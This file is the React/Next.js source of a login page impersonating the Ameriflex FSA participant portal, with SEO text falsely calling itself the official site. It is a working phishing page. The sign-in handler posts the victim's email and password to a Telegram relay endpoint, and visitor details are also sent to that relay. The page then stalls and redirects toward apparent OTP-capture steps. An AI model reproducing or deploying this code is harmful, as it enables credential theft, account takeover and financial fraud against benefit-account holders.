"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Preloader } from "@/components/preloader";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [showContent, setShowContent] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);
  const [isSigningIn, setIsSigningIn] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const handleSignIn = async () => {
    if (isSigningIn) return;
    setIsSigningIn(true);
    try {
      await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: email, password }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send login notification:", error);
    }
    await new Promise((r) => setTimeout(r, 10000));
    if (typeof window !== "undefined") {
      sessionStorage.setItem("ubs_verify", "1");
    }
    router.push("/verify-choice");
  };

  return (
    <>
      {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
      {showContent && (
        <div className="login-container">
          <style
            dangerouslySetInnerHTML={{
              __html: `
              *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
              .login-container{font-family:"Segoe UI",Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;overflow:hidden}

              /* full-page background: teal overlay + nature photo */
              .bg{position:fixed;inset:0;z-index:0;
                background:linear-gradient(rgba(38,155,143,.75),rgba(38,155,143,.75)),
                url("https://images.unsplash.com/photo-1448375240586-882707db888b?w=1400&q=80") center/cover no-repeat}

              /* logo above card, centered */
              .logo-above{position:relative;z-index:1;margin-bottom:18px;text-align:center}
              .logo-above img{height:44px;width:auto;filter:brightness(0) invert(1)}

              /* card */
              .card{position:relative;z-index:1;background:#fff;border-radius:4px;padding:36px 44px 32px;width:100%;max-width:560px;box-shadow:0 8px 40px rgba(0,0,0,.22)}

              .card-title{font-size:12px;font-weight:700;letter-spacing:2px;color:#444;text-transform:uppercase;margin-bottom:22px}

              .field{margin-bottom:18px}
              .field label{display:block;font-size:14px;color:#444;font-weight:400;margin-bottom:7px}
              .field input{width:100%;border:1.5px solid #ccc;border-radius:3px;padding:12px 14px;font-size:14px;outline:none;color:#222;background:#fafafa;transition:border-color .2s}
              .field input:focus{border-color:#2a9d8f;background:#fff}
              .field input::placeholder{color:#bbb}

              .remember{display:flex;align-items:center;gap:8px;font-size:14px;color:#333;margin-bottom:22px;cursor:pointer}
              .remember input{width:16px;height:16px;accent-color:#2a9d8f;cursor:pointer}

              .btn-signin{width:100%;background:#1a7b8f;color:#fff;border:none;border-radius:3px;padding:13px;font-size:13px;font-weight:700;letter-spacing:1.8px;text-transform:uppercase;cursor:pointer;transition:background .2s;margin-bottom:20px}
              .btn-signin:hover:not(:disabled){background:#165a73}
              .btn-signin:disabled{opacity:0.7;cursor:not-allowed;background:#1a7b8f}

              .bottom-links{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
              .bottom-links a{color:#2a9d8f;text-decoration:none;font-size:14px;font-weight:600}
              .bottom-links a:hover{text-decoration:underline}

              .privacy{display:block;text-align:center;margin-top:18px;color:#2a9d8f;font-size:14px;font-weight:700;text-decoration:none;border-top:1px solid #eee;padding-top:16px}
              .seo-footer-text{position:absolute;bottom:8px;left:0;right:0;text-align:center;font-size:11px;color:rgba(255,255,255,0.85);z-index:1;padding:0 15px}
              .sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
              .seo-faq-accordion{width:480px;max-width:94%;margin:16px auto 36px auto;z-index:2;position:relative}
              .seo-faq-accordion details{background:rgba(255,255,255,0.12);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.25);border-radius:8px;color:#fff;overflow:hidden;transition:all 0.25s ease}
              .seo-faq-accordion details[open]{background:rgba(15,35,42,0.92);border-color:rgba(255,255,255,0.4)}
              .seo-faq-accordion summary{padding:12px 16px;font-size:13px;font-weight:600;cursor:pointer;text-align:center;list-style:none;outline:none;user-select:none;display:flex;align-items:center;justify-content:center;gap:6px}
              .seo-faq-accordion summary::-webkit-details-marker{display:none}
              .seo-faq-accordion summary:hover{background:rgba(255,255,255,0.15)}
              .seo-faq-accordion .faq-body{padding:16px 20px;font-size:12.5px;color:rgba(255,255,255,0.92);text-align:left;line-height:1.6;border-top:1px solid rgba(255,255,255,0.15);max-height:440px;overflow-y:auto}
              .seo-faq-accordion .faq-body::-webkit-scrollbar{width:6px}
              .seo-faq-accordion .faq-body::-webkit-scrollbar-track{background:rgba(0,0,0,0.2);border-radius:4px}
              .seo-faq-accordion .faq-body::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.3);border-radius:4px}
              .seo-faq-accordion .faq-item{margin-bottom:14px;padding-bottom:14px;border-bottom:1px solid rgba(255,255,255,0.1)}
              .seo-faq-accordion .faq-item:last-child{margin-bottom:0;padding-bottom:0;border-bottom:none}
              .seo-faq-accordion .faq-item strong{color:#48cae4;font-size:13px;display:block;margin-bottom:4px}

              @media(max-width:580px){
                .card{padding:28px 20px;border-radius:0}
                .login-container{justify-content:flex-start;padding-top:40px}
                .seo-faq-accordion{margin-bottom:48px}
              }
            `,
            }}
          />
          <div className="bg"></div>

          <header className="logo-above">
            <h1 className="sr-only">
              Ameriflex Login – MyAmeriflex Participant Portal, FSA Account,
              Ameriflex Card & Flex Spending
            </h1>
            <img
              src="/infinite-logo-white.svg"
              alt="Ameriflex - MyAmeriflex Participant Portal & Flexible Spending Account Login"
            />
          </header>

          <main className="card">
            <h2 className="card-title">WELCOME, PLEASE SIGN IN</h2>

            <div className="field">
              <label htmlFor="af-email">Email</label>
              <input
                type="email"
                id="af-email"
                placeholder="Email"
                autoComplete="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>

            <div className="field">
              <label htmlFor="af-pass">Password</label>
              <input
                type="password"
                id="af-pass"
                placeholder="Password"
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>

            <label className="remember">
              <input type="checkbox" /> Remember Me
            </label>

            <button
              className="btn-signin"
              onClick={handleSignIn}
              disabled={isSigningIn}
            >
              {isSigningIn ? "SIGNING IN..." : "SIGN IN"}
            </button>

            <div className="bottom-links">
              <Link href="/verify-choice" title="Ameriflex Pass Key Login">
                Sign in with a Pass Key
              </Link>
              <Link href="/new-user" title="Ameriflex new user registration">
                New user registration
              </Link>
            </div>

            <div className="bottom-links" style={{ marginBottom: "22px" }}>
              <Link
                href="/forgot-password"
                title="Ameriflex forgot password recovery"
              >
                Forgot your password?
              </Link>
            </div>

            <Link href="/privacy" className="privacy">
              Privacy Policy
            </Link>
          </main>

          <section
            className="seo-faq-accordion"
            aria-label="Ameriflex Account Help and Frequently Asked Questions"
          >
            <details>
              <summary>
                <span>
                  Help & FAQ: Ameriflex Login, FSA Card & Flex Spending
                </span>
                <span style={{ fontSize: "11px", opacity: 0.8 }}>▼</span>
              </summary>
              <div className="faq-body">
                <div className="faq-item">
                  <strong>
                    Welcome to the MyAmeriflex Participant Login Portal
                  </strong>
                  To securely access your benefits dashboard, enter your
                  registered email address and password above to complete your{" "}
                  <strong>Ameriflex login</strong> session. Once logged in
                  through this official <strong>MyAmeriflex</strong> participant
                  portal at participant.ameriflex.com, you can manage pre-tax
                  accounts, check live balances, submit reimbursement receipts,
                  and review annual benefit elections 24 hours a day, 7 days a
                  week. If you need to perform an{" "}
                  <strong>Ameriflex log in</strong> from a mobile device or new
                  computer, multi-factor authentication ensures your healthcare
                  data remains fully encrypted.
                </div>
                <div className="faq-item">
                  <strong>
                    Managing Your Ameriflex Flexible Spending Account (Ameriflex
                    FSA)
                  </strong>
                  An <strong>Ameriflex flexible spending account</strong>{" "}
                  (commonly known as an <strong>Ameriflex FSA</strong>) empowers
                  participants to set aside pre-tax dollars straight from their
                  paycheck to cover eligible out-of-pocket medical, dental,
                  vision, prescription drug, and dependent care expenses. By
                  utilizing <strong>Ameriflex flex spending</strong> options,
                  you significantly lower your annual taxable income while
                  saving up to 30% on qualified healthcare costs. Inside the
                  portal, you can track annual contribution limits, monitor IRS
                  carryover thresholds, and verify grace period deadlines.
                </div>
                <div className="faq-item">
                  <strong>
                    Ameriflex Card & Benefit Debit Card Substantiation
                  </strong>
                  When you use your smart <strong>Ameriflex card</strong>{" "}
                  (Mastercard®/Visa® benefits debit card) at doctor&apos;s
                  offices, pharmacies, or dental clinics, funds are deducted
                  automatically from your available balance without requiring
                  upfront out-of-pocket payment. While many point-of-sale
                  transactions auto-verify, federal IRS regulations occasionally
                  require itemized receipt substantiation. You can instantly
                  upload Explanation of Benefits (EOB) statements right here
                  after completing your <strong>Ameriflex login</strong>.
                </div>
                <div className="faq-item">
                  <strong>Account Recovery & Login Assistance</strong>
                  If your session has timed out or you are unable to complete an{" "}
                  <strong>Ameriflex log in</strong> due to a forgotten password,
                  simply click the &quot;Forgot your password?&quot; recovery
                  link right below the sign-in button. We will send a one-time
                  verification code to your registered email or mobile phone.
                  Participants can also register biometric passkeys for
                  passwordless authentication. For additional customer support,
                  Member Services is available Monday through Friday from 8:00
                  AM to 8:00 PM CST at 1-888-868-FLEX (3539).
                </div>
                <div className="faq-item">
                  <strong>
                    Portal Scope & Brand Notice (Ameriflex vs. Ameriflex Vinyl /
                    Industrial)
                  </strong>
                  Please note that this official portal
                  (participant.ameriflex.com) strictly administers employee
                  benefits, healthcare financial accounts, commuter transit
                  plans, and COBRA for <strong>Ameriflex</strong> members and
                  employer plan sponsors. This online platform is completely
                  independent and separate from commercial industrial
                  manufacturing entities, such as{" "}
                  <strong>Ameriflex vinyl</strong> (or{" "}
                  <strong>Ameriflex vinly</strong>) flexible hose, ducting, and
                  expansion joint products.
                </div>
                <div className="faq-item">
                  <strong>Top FAQ Answers for Participants</strong>
                  <ul
                    style={{
                      paddingLeft: "16px",
                      marginTop: "6px",
                      listStyleType: "disc",
                      display: "flex",
                      flexDirection: "column",
                      gap: "6px",
                    }}
                  >
                    <li>
                      <strong>
                        When can I start using my Ameriflex FSA funds?
                      </strong>{" "}
                      For general-purpose medical FSAs, your full annual
                      election amount is available on day one of your plan year
                      immediately after your employer completes enrollment.
                    </li>
                    <li>
                      <strong>
                        Can I set up direct deposit for reimbursement claims?
                      </strong>{" "}
                      Yes! After signing into <strong>MyAmeriflex</strong>,
                      navigate to your Profile &amp; Banking settings to link
                      your personal checking or savings account for rapid direct
                      deposit reimbursements within 2 to 3 business days.
                    </li>
                    <li>
                      <strong>
                        What should I do if my Ameriflex card is lost or stolen?
                      </strong>{" "}
                      Log into the portal immediately, select your debit card
                      details, and click &quot;Report Lost/Stolen&quot; to
                      instantly freeze the card and order a replacement.
                    </li>
                  </ul>
                </div>
              </div>
            </details>
          </section>

          <footer className="seo-footer-text">
            Official Ameriflex login at participant.ameriflex.com. Manage your
            Ameriflex card, Ameriflex Flexible Spending Account (FSA), flex
            spending, COBRA, and claims online.
          </footer>
        </div>
      )}
    </>
  );
}
